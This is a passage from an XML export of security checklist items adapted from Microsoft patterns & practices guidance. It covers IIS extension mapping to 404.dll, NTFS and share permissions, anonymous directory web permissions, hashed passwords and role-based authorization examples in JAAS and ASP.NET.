&lt;li&gt;&lt;strong&gt;Static Web Server&lt;/strong&gt;. If you run IISLockdown and choose the Static Web server option, then all of the above extensions are mapped to the 404.dll.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Dynamic Web Server&lt;/strong&gt;. If you choose the Dynamic Web server option, which is the preferred option when serving ASP.NET pages, then .htr, .idc, .shtm, .shtml, .stm, and .printer are mapped to the 404.dll, while .asp, .cer, .cdx, and .asa are
 not. In this case, you should manually map .cer, .cdx, and .asa to the 404.dll. If you are not serving .asp, then you can map that as well.
&lt;/li&gt;&lt;/ul&gt;
&lt;h3&gt;Why Map to the 404.dll?&lt;/h3&gt;
&lt;p&gt;By mapping file extensions to the 404.dll, you prevent files from being returned and downloaded over HTTP. If you request a file with an extension mapped to the 404.dll, a Web page with the message &amp;quot;HTTP 404 - File not found&amp;quot; is displayed. You are recommended
 to map unused extensions to the 404.dll rather than deleting the mapping. If you delete a mapping, and a file is mistakenly left on the server (or put there by mistake) it can be displayed in clear text when it is requested because IIS does not know how to
 process it.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;To map a file extension to the 404.dll&lt;/strong&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Start IIS. &lt;/li&gt;&lt;li&gt;Right-click your server name in the left window, and then click &lt;strong&gt;Properties&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Ensure that the &lt;strong&gt;WWWService&lt;/strong&gt; is selected in the &lt;strong&gt;Master&lt;/strong&gt;
&lt;strong&gt;Properties&lt;/strong&gt; drop-down list, and then click the adjacent &lt;strong&gt;Edit&lt;/strong&gt; button.
&lt;/li&gt;&lt;li&gt;Click the &lt;strong&gt;Home&lt;/strong&gt; &lt;strong&gt;Directory&lt;/strong&gt; tab. &lt;/li&gt;&lt;li&gt;Click &lt;strong&gt;Configuration&lt;/strong&gt;. The tabbed page is shown below.
&lt;p&gt;&lt;img src="http://msdn2.microsoft.com/en-us/library/Aa302432.f16thcm04(en-us,MSDN.10).gif" style="border:1px solid #000"&gt;&amp;nbsp;&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;p&gt;&lt;strong&gt;&lt;em&gt;Mapping application extensions&lt;/em&gt;&lt;/strong&gt; &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Select one of the extensions from the list, and then click &lt;strong&gt;Edit&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Click &lt;strong&gt;Browse&lt;/strong&gt; and navigate to \WINNT\system32\inetsrv\404.dll.
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;This step assumes that you have previously run IISlockd.exe, as the 404.dll is installed by the IISLockdown tool.&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;Click &lt;strong&gt;Open&lt;/strong&gt;, and then click &lt;strong&gt;OK&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Repeat steps 6, 7 and 8 for all of the remaining file extensions. &lt;/li&gt;&lt;/ol&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>30c2b6d3-46a6-4f59-97ea-1b13a3c66f38</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Files and directories are contained on NTFS volumes.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that files and directories are contained on NTFS volumes to benefit from NTFS permissions&amp;nbsp;for restricted access.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;The default NTFS permissions for Windows&amp;nbsp;2000 grant members of the &lt;strong&gt;Everyone&lt;/strong&gt; group full control access to a number of key locations, including the root directory, \inetpub, and \inetpub\scripts.&lt;/p&gt;
&lt;p&gt;First grant FULL CONTROL to the Administrator account to the root (\), then remove access rights for the
&lt;strong&gt;Everyone&lt;/strong&gt; group from the following directories. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Root (\) &lt;/li&gt;&lt;li&gt;System directory (\WINNT\system32) &lt;/li&gt;&lt;li&gt;Framework tools directory (\WINNT\Microsoft.NET\Framework\{version}) &lt;/li&gt;&lt;li&gt;Web site root directory and all content directories (the default is \inetpub\*)
&lt;/li&gt;&lt;/ul&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;This is not an issue in Windows Server 2003.&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>31a7325f-96da-4736-aeca-95556d9f3efe</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Role-based Security Checks are Performed</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Authorization</category>
    <phase>Design</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that all users are assigned to specific roles. Verify that all access controls are performed on a per-role basis rather than a per-user basis.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Application roles allow multiple users to play the same role. This mechanism provides an easy and clear way to discover and manage the least privileges necessary for the execution of a given task. It provides a more robust and flexible way of managing the
 application's users.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to determine if your application uses role-based access controls:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check if your application uses user roles. &lt;/strong&gt;Verify that your application has established user roles and grants the appropriate access privileges to each user role. Example:&lt;/p&gt;
&lt;pre&gt;Roles      Actions    Access Controls    Client Accounts&lt;br&gt;--------------------------------------------------------&lt;br&gt;Manager    Connect        Always            Always&lt;br&gt;           Read           Always            Always&lt;br&gt;           Use            Always            Occasionally&lt;br&gt;           Modify         Never             Occasionally&lt;br&gt;Employee   Connect        Always            Always&lt;br&gt;           Read           Always            Always&lt;br&gt;           Use            Always            Always&lt;br&gt;           Modify         Never             Never&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure your application enforces role-based security. &lt;/strong&gt;Verify that your application maps its access controls to the established user roles. Depending on your application's design, there are several ways of checking whether your application
 enforces role-based security:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check for programmatical role-based security:&lt;/strong&gt; If your application uses programmatic security, verify that JAAS is implemented correctly throughout the code. Use the following steps to ensure that access controls are positioned according
 to your application's security requirements:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all functionality that requires access controls:&lt;/strong&gt; Using your application's design, identify all functionality that requires special privileges. Verify that each protected functionality has a permissions check associated with it.
 For instance, the following code verifies that the user has permission to connect to the application:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;// The variable subject represents the user's identity an all&lt;br&gt;// security tokens that are associated with it&lt;br&gt;PrivilegedExceptionAction action = new AuthException(&amp;quot;AccessApp&amp;quot;);&lt;br&gt;Subject.doAsPrivileged(subject, action, null);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;Note that &lt;strong&gt;AuthException&lt;/strong&gt; is a custom implementation of the &lt;strong&gt;
PrivilegedExceptionAction&lt;/strong&gt; interface. See the &lt;a href="?#ruledisplay:6CD5BCAD-590C-4DB0-AC31-9D1F4A9201C9"&gt;
Consider Using JAAS for Authorization&lt;/a&gt; guideline for more details.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that all user roles' permissions comply with your application's security requirements:&lt;/strong&gt; Examine your application's JAAS policy and verify that each user role is granted only the necessary set of permissions. Example:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;grant Principal application.auth.GroupToken &amp;quot;users&amp;quot;&lt;br&gt;{&lt;br&gt;   permission java.security.SecurityPermission &amp;quot;AccessApp&amp;quot;;&lt;br&gt;};&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check for declarative role-based security:&lt;/strong&gt; If your application uses declarative security, examine its deployment descriptor file (e.g.
&lt;strong&gt;web.xml&lt;/strong&gt;). Verify that access to protected resources is granted according to the application's security requirements.&amp;nbsp;Verify that each
&lt;strong&gt;web-resource-collection&lt;/strong&gt; element inside the deployment descriptor is associated with the appropriate resource and user roles:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;security-constraint&lt;/strong&gt;: Check if all of your application's protected resources are placed within a
&lt;strong&gt;security-constraint&lt;/strong&gt; element. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;web-resource-collection&lt;/strong&gt;: Check if all resources that share mutual access controls are encapsulated by the same
&lt;strong&gt;web-resource-collection&lt;/strong&gt; element. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;web-resource-name&lt;/strong&gt;: Check if all collections of resources are identified by a name.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;url-pattern&lt;/strong&gt;: For each collection of resources, verify that all resources are placed in the appropriate
&lt;strong&gt;web-resource-collection&lt;/strong&gt; elements. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;http-method&lt;/strong&gt;: If your application requires access controls only for specific HTTP methods, verify that all of these methods are identified appropriately.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;auth-constraint&lt;/strong&gt;: Check if each &lt;strong&gt;web-resource-collection&lt;/strong&gt; element has an
&lt;strong&gt;auth-constraint&lt;/strong&gt; element associated with it. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;role-name&lt;/strong&gt;: Verify that all roles are granted access according to your application's security requirements.
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that users are assigned into their appropriate roles. &lt;/strong&gt;
List all of your application's users. Check if each user is assigned into their appropriate role.&lt;/p&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following segment illustrates a JAAS policy. Because the application does not enforce role-based security, it has a policy entry for each separate user; therefore, changing the users' access rights can be quite difficult as every user needs to be modified.&lt;/p&gt;
&lt;br&gt;
&lt;blockquote&gt;
&lt;pre&gt;grant Principal application.auth.UserToken &amp;quot;joe&amp;quot;&lt;br&gt;{&lt;br&gt;   permission java.security.SecurityPermission &amp;quot;AccessApp&amp;quot;;&lt;br&gt;};&lt;br&gt;grant Principal application.auth.UserToken &amp;quot;steve&amp;quot;&lt;br&gt;{&lt;br&gt;   permission java.security.SecurityPermission &amp;quot;AccessApp&amp;quot;;&lt;br&gt;};&lt;br&gt;grant Principal application.auth.UserToken &amp;quot;julie&amp;quot;&lt;br&gt;{&lt;br&gt;   permission java.security.SecurityPermission &amp;quot;AccessApp&amp;quot;;&lt;br&gt;};&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:2A2791FA-47DB-4528-9EEC-03482142AABF"&gt;Guideline: Perform Role-Based Security Checks (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>32737ad9-4a30-4742-8d88-066ab648613d</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Access to required shares is restricted </title>
    <topic>Security</topic>
    <technology>Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check that access to required shares is restricted and also ensure that the Everyone group does not have access.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;h3&gt;Restrict Access to Required Shares&lt;/h3&gt;
&lt;p&gt;Remove the Everyone group and grant specific permissions instead. Everyone is used when you do not have restrictions on who should have access to the share.&lt;/p&gt;
&lt;h3&gt;Additional Considerations&lt;/h3&gt;
&lt;p&gt;If you do not allow remote administration of your server, remove unused administrative shares, for example
&lt;strong&gt;C$&lt;/strong&gt; and &lt;strong&gt;Admin$&lt;/strong&gt;.&lt;/p&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Some applications may require administrative shares. Examples include Microsoft Systems Management Server (SMS) and Microsoft Operations Manager (MOM). For more information, see Microsoft Knowledge Base article 318751, &amp;quot;How
 To: Remove Administrative Shares in Windows&amp;nbsp;2000 or Windows&amp;nbsp;NT&amp;nbsp;4.0.&amp;quot;&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>38741635-2879-40d9-acc5-64463114d8cc</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Available services are secured.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that all the available services are secured when configuring your network switches.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>390fa3c5-5eee-45f3-bfe5-918d99d90e89</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Virtual directories that allow anonymous access restrict Write and Execute Web permissions for the anonymous account.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that virtual directories that allow anonymous access restricts Write and Execute Web permissions for the anonymous account.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;Web permissions are configured through the IIS snap-in and are maintained in the IIS metabase. They are not NTFS permissions.&lt;/p&gt;
&lt;p&gt;Use the following Web permissions: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Read Permissions&lt;/strong&gt;. Restrict Read permissions on include directories.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Write and Execute Permissions&lt;/strong&gt;. Restrict Write and Execute permissions on virtual directories that allow anonymous access.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Script source access&lt;/strong&gt;. Configure Script source access permissions only on folders that allow content authoring.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;Write&lt;/strong&gt;. Configure Write permissions only on folders that allow content authoring. Grant write access only to content authors.
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;Folders that support content authoring should be configured to require authentication and SSL for encryption.&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>3b00a05d-4063-4aee-8995-e8dad7193f57</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Hashed Password Format is Specified in Membership Provider Configuration</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authentication</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that hashed password format is specified in provider configuration.&lt;/p&gt;
&lt;h1&gt;Related Items&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:385e4669-6c74-4cfa-b94f-5fcc754a263f"&gt;Specify Hashed Password Format in Provider Configuration&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>43267080-4116-433f-aad2-4026a365259a</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Role-based Security Checks are Performed</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Authorization</category>
    <phase>Design</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure your application creates specific roles for different types of users. Verify when authorizing access to a resource that&amp;nbsp;security checks are performed on a per-role basis rather than on a per-user basis.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Application roles allow multiple users to play the same role. This mechanism provides a clear way to discover and manage the least privileges necessary for the execution of a given task and&amp;nbsp;provides a more robust&amp;nbsp;means of managing the application's users.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to determine if your application uses role-based access controls:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check if your application uses user roles.&lt;/strong&gt; Verify that your application has established user roles and grants the appropriate access privileges to each user role. The roles and their privileges within the application should be defined in
 the documentation, to ensure that they have been examined in the context of the business purpose of the application, and to allow them to be checked against the application as implemented. Example:&lt;/p&gt;
&lt;pre&gt;Roles      Actions    Access Controls    Client Accounts&lt;br&gt;--------------------------------------------------------&lt;br&gt;Manager    Connect        Always            Always&lt;br&gt;           Read           Always            Always&lt;br&gt;           Use            Always            Occasionally&lt;br&gt;           Modify         Never             Occasionally &lt;br&gt;Employee   Connect        Always            Always&lt;br&gt;           Read           Always            Always&lt;br&gt;           Use            Always            Always&lt;br&gt;           Modify         Never             Never&lt;/pre&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure that your application enforces role-based security. &lt;/strong&gt;Verify that your application maps its access controls to the established user roles.&amp;nbsp;Ensure that the roles used are sufficiently fine grained. Remember that the goal is to segment
 privileges within the application, not to simply control access to the entire application. Roles should be mapped to specific pages or functions within the application. Depending on your application's design, there are several ways of checking whether your
 application enforces role-based security: &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check for programmatically role-based security:&lt;/strong&gt; If your application has security checks embedded inside its code base, identify all functionality that requires special privileges. Verify that each protected functionality has a permissions
 check associated with it.&lt;/p&gt;
&lt;p&gt;For example, the following code verifies that users are share holders before generating the appropriate financial report:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;public void GenerateFinancialReport(DateTime startDate, DateTime endDate)&lt;br&gt;{&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; if (HttpContext.Current.User.IsInRole(&amp;quot;ShareHolders&amp;quot;))&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; {&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; // Generate the relevant financial report&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; }&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check for declarative role-based security:&lt;/strong&gt; If your application uses declarative security, examine its
&lt;strong&gt;web.config&lt;/strong&gt; file. Verify that access to protected resources is granted according to the application's security requirements. Check that each resource is associated with the appropriate user roles in the configuration file:
&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;roleManager&lt;/strong&gt;: Check that the ASP.NET role manager is configured using the
&lt;strong&gt;roleManager&lt;/strong&gt; element if form-based authentication is used. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;authorization&lt;/strong&gt;: Check that the authorization settings for a resource are encapsulated by the
&lt;strong&gt;authorization&lt;/strong&gt; element. &lt;/li&gt;&lt;li&gt;&lt;strong&gt;allow&lt;/strong&gt;: Check that the users and roles that are allowed access to the given resource are enumerated.
&lt;/li&gt;&lt;li&gt;&lt;strong&gt;deny&lt;/strong&gt;: Check that the users and roles that are denied access to the given resource are enumerated.
&lt;p&gt;Example:&lt;/p&gt;
&lt;pre&gt;&amp;lt;configuration&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;system.web&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;roleManager enabled=&amp;quot;true&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; cacheRolesInCookie=&amp;quot;false&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; defaultProvider=&amp;quot;ProjectRoleProvider&amp;quot;&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;providers&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;clear /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;add name=&amp;quot;ProjectRoleProvider&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; type=&amp;quot;System.Web.Security.SqlRoleProvider&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; connectionStringName=&amp;quot;ProjectConnection&amp;quot;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; applicationName=&amp;quot;myapp&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;authorization&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;allow roles=&amp;quot;Employees, Managers&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;deny users=&amp;quot;*&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Check for role-based security managed by Windows:&lt;/strong&gt; If your application uses Windows
&lt;strong&gt;Local Users and Groups&lt;/strong&gt; to manage its role-based security needs, verify that your application's web.config is configured properly.&lt;/p&gt;
&lt;p&gt;Example:&lt;/p&gt;
&lt;pre&gt;&amp;lt;configuration&amp;gt;&lt;br&gt;&amp;nbsp; &amp;lt;system.web&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;authentication mode=&amp;quot;Windows&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;authorization&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;allow roles=&amp;quot;NTDomain\Employees, NTDomain\Managers&amp;quot; /&amp;gt;&lt;br&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;lt;deny users=&amp;quot;*&amp;quot; /&amp;gt;&lt;/pre&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;ul&gt;
&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that users are assigned into their appropriate roles. &lt;/strong&gt;
List all of your application's users.&amp;nbsp;Check if each user is assigned into their appropriate role. The application should apply the security policy according to the user roles instead of the actual user. Based on your application's mechanism to enforce role-based
 access controls, check that one of the following techniques is used to manage your application's users&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
